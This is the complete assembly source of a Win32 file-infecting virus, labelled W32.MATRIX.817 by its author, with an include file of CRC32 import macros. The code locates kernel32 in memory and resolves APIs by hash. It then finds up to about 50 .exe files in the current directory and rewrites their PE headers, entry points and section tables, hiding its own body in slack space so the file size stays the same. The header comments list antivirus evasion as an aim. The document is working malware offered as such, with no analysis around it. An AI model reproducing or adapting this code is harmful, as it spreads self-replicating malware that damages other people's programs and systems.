   ; W32.MATRIX.817
   ;
   ; - dont change file size
   ; - small virus
   ; - fast
   ; - not detect by AV
   ; - use CRC32 for find API's
   ; - change 1 & 2 sec. at end
   ;
   ; (c) LordDark [MATRiX]

   find_str struc
            dwFileAttributes  dd ?
            ftCreationTime    dq ?
            ftLastAccessTime  dq ?
            ftLastWriteTime   dq ?
            nFileSizeHigh     dd ?
            nFileSizeLow      dd ?
            dwReserved0       dd ?
            dwReserved1       dd ?
            cFileName         db 260 dup (?)
            cAlternateFileName db 14 dup (?)
            ends


   include 1.inc
   locals __
   .386p
   .model flat
   .data
   start:
       db 68h
   start_ip_1 dd 1000h
       db 68h
   start_ip_2 dd 0
       pushad
       call $+5
   delta:
       pop  ebp
       sub  ebp, offset delta
       call seh
       mov  esp, [esp.8]
       jmp  end_seh
   seh:
       sub  eax, eax
       push 4 ptr fs:[eax]
       mov  4 ptr fs:[eax], esp
       mov  ebx, [esp+12*4]
       sub  bx, bx
   __0:
       sub  ebx, 10000h
       mov  ax, 2 ptr [ebx]
       not  eax
       cmp  ax, not 'ZM'
       jnz  __0
       ; ebx - K32 base
       lea esi, [ebp+import_table]
   __2x:
       lodsd
       test al, al
       jz  __1x
       mov  dl, [esi]
       inc  esi
       push esi
       call get_proc
       pop  edi
       stosd
       mov esi, edi
       jmp __2x
   __1x:
       sub  edi, edi
       push edi
       call [ebp+GetModuleHandleA]
       mov  4 ptr [esp+(10*4)], eax
       sub  esp, size find_str
       mov  esi, esp
       push esi
       lea  eax, [ebp+mask]
       push eax
       call [ebp+FindFirstFileA]
       cmp  eax, -1
       jz  __1
   __2:
       push eax edi esi
       lea  edx, [esi.cFileName]
       mov  edi, [esi.nFileSizeLow]
       call infect
       pop  esi
       push esi
       push 4 ptr [esp.8]
       call [ebp+FindNextFileA]
       pop edi
       inc edi
       cmp edi, 50
       ja  __3
       test eax, eax
       pop eax
       jnz __2
       push eax
   __3:
       call [ebp+FindClose]
   __1:
       add  esp, size find_str
   end_seh:
       pop 4 ptr fs:[0]
       pop eax
       popad
       pop eax
       add [esp], eax
       ret

   mask db '*.exe',0


   get_proc proc
       push ebx ebp
       ; ebx - CRC32
       ; eax - DLL offset
       ; dl  - first char
       mov edi, [ebx+3Ch]
       mov edi, [edi+78h+ebx]
       mov ecx, [edi+18h+ebx]
       mov esi, [edi+20h+ebx]
   __1:
       mov ebp, [esi+ebx]
       add ebp, ebx
       cmp 1 ptr [ebp], dl
       jnz __2
       push ebx ecx
       ; use ebx, ecx
       ; ebp - offset to name'z
       push -1
       pop ebx
   __5:
       xor bl, 1 ptr [ebp]
       inc ebp
       push 8
       pop ecx
   __3:
       shr ebx, 1
       jnc __4
       xor ebx, CRC32_init
   __4:
       loop __3
       cmp  1 ptr [ebp], 0
       jnz __5
       cmp eax, ebx
       pop ecx ebx
       jz __6
   __2:
       add esi, 4
       loop __1
   __6:
       sub ecx, [edi+18h+ebx]
       neg ecx
       add ecx, ecx
       add ecx, [edi+24h+ebx]
       movzx ecx, 2 ptr [ecx+ebx]
       shl ecx, 2
       add ecx, [edi+1Ch+ebx]
       mov eax, [ecx+ebx]
       add eax, ebx
       pop ebp ebx
   _ret:
       ret
       endp

   import_table:
       ; my import's
       import_nam FindFirstFileA
       import_nam FindNextFileA
       import_nam FindClose
       import_nam ReadFile
       import_nam SetFilePointer
       import_nam WriteFile
       import_nam CreateFileA
       import_nam CloseHandle
       import_nam GetModuleHandleA
       import_end

   infect proc
        sub eax, eax
        push eax eax
        push 3
        push eax
        inc eax
        push eax
        push 0C0000000h
        push edx
        call [ebp+CreateFileA]
        cmp eax, -1
        jz  _ret
        xchg eax, ebx
        lea edx, [ebp+buffer]
        mov ah, 3Fh
        push 3Ch+4
        pop ecx
        call dos
        xor ecx, eax
        jnz close_1
        cmp byte ptr [edx], 'M'
   close_1:
        jnz close_2
        mov eax, 4 ptr [edx.3Ch]
        mov 4 ptr [ebp+pe_ofs], eax
        xchg edx, eax
        call dos
        mov cx, 0F8h + (28h*8)
        lea edx, [ebp+buffer]
        mov ah, 3Fh
        call dos
        xor ecx, eax
   close_2:
        jnz close_3
        cmp byte ptr [edx], 'P'
   close_3:
        jnz close_4
        mov 4 ptr [edx.58h], ecx
        test 1 ptr [edx.16h+1], 20h
   close_4:
        jnz close_5
        test 1 ptr [edx.16h],   02h
        jz  close
        cmp  2 ptr [edx.04h], 014Eh
        ja  close_ja
        mov al, 1 ptr [edx.6]
        cmp al, 8
   close_ja:
        ja  close
        cmp al, 2
        jb close
        movzx eax, 2 ptr [edx.14h]
        cmp al, 0E0h
   close_5:
        jnz close_6
        lea esi, [eax+18h+edx]
        movzx eax, 2 ptr [edx.06h]
        dec eax
        imul eax, eax, 28h
        add esi, eax
        mov eax, 4 ptr [esi.14h]
        add eax, 4 ptr [esi.10h]
        cmp eax, edi
   close_6:
        jnz close_7
        mov  eax, 4 ptr [edx.28h]
        mov  4 ptr [ebp+start_ip_1], eax
        mov  eax, 4 ptr [edx.34h]
        mov  4 ptr [ebp+start_ip_2], eax
        lea  eax, [edi-vl]
        mov  edi, eax
        sub  eax, [esi.14h]
        add  eax, 4 ptr [esi.0Ch]
        mov  4 ptr [edx.28h], eax
        or   1 ptr [esi.24h+3], 0C0h
        ; adapt virtual size & image size
        mov eax, 4 ptr [esi.10h]
        add eax, _vl
        push edx eax
        mov ecx, 4 ptr [edx.3Ch]
        xor edx, edx
        div ecx
        inc eax
        mul ecx
        cmp eax, 4 ptr [esi.8]
        jb  __k
        mov 4 ptr [esi.08h], eax
   __k:
        pop eax edx
        add eax, 4 ptr [esi.0Ch]
        mov ecx, 4 ptr [edx.38h]
        push edx
        xor edx, edx
        div ecx
        inc eax
        mul ecx
        pop edx
        cmp eax, 4 ptr [edx.50h]
        jb  __kk
        mov 4 ptr [edx.50h], eax
   __kk:
        ; swap sections
        push 28h/4
        pop ecx
   __xx:
        push 4 ptr [esi-28h]
        push 4 ptr [esi]
        pop  4 ptr [esi-28h]
        pop  4 ptr [esi]
        lodsd
        loop __xx
        lea  esi, [ebp+dos]
        mov  edx, edi
        call esi
        mov  ah, 3Fh
        mov  cx, vl
        lea  edx, [ebp+check_sp]
        call esi
        push edi
        mov  edi, edx
        sub  al, al
        repe  scasb
        pop  edx
   close_7:
        jnz  close
        call esi
        mov  ah, 40h
        mov  cx, vl
        lea  edx, [ebp+start]
        call esi
        xor ecx, eax
        jnz close
        mov edx, 0
   pe_ofs   equ 4 ptr $-4
        call esi
        mov ah, 40h
        mov cx, 0F8h + (28h*8)
        lea edx, [ebp+buffer]
        call esi
   close:
        push ebx
        call [ebp+CloseHandle]
   __1:
        ret
        endp

   dos proc
       pushad
       sub esi, esi
       cmp ah, 40h
       jnz __1
       push eax
       mov  eax, esp
       push esi
       push eax
       push ecx
       push edx
       push ebx
       call [ebp+WriteFile]
       pop eax
       jmp __2
   __1:
       cmp ah, 3Fh
       jnz __4
       push eax
       mov  eax, esp
       push esi
       push eax
       push ecx
       push edx
       push ebx
       call [ebp+ReadFile]
       pop eax
       jmp __2
   __4:
       push esi
       push esi
       push edx
       push ebx
       call [ebp+SetFilePointer]
       jmp __2
   __2:
       mov 4 ptr [esp.1Ch], eax
       popad
       ret
       endp


   vl = ($-start)
   buffer   db 0F8h + (28h*8) dup (?)
   check_sp db vl dup (?)
   _vl = ($-buffer)
   .code
   host32:
       push 0
       extrn ExitProcess: proc
       call ExitProcess
       db 'Win32.Matrix.'
       db vl / 100  mod 10 + '0'
       db vl / 10   mod 10 + '0'
       db vl / 1    mod 10 + '0'

   end start

   ; --[1.inc]-------------------------------------------------------------------->8


   CRC32_init  equ 0EDB88320h
   CRC32_num       equ 0FFFFFFFFh

   CRC32   macro   string
           crcReg = CRC32_num
           irpc    _x,<string>
           ctrlByte = '&_x&' xor (crcReg and 0FFh)
           crcReg = crcReg shr 8
           rept 8
               ctrlByte = (ctrlByte shr 1) xor (CRC32_init * (ctrlByte and 1))
           endm
           crcReg = crcReg xor ctrlByte
           endm
           dd  crcReg
   endm

   import_beg macro kernel
              db '&kernel&',0
              endm
   import_nam macro name
              CRC32 &name&
              local b
              b=0
              irpc a,<name>
                  IF b EQ 0
                     db '&a&'
                  ENDIF
                  b=b+1
              endm
   &name&     dd    0
              endm
   import_end macro
              db 0
              endm
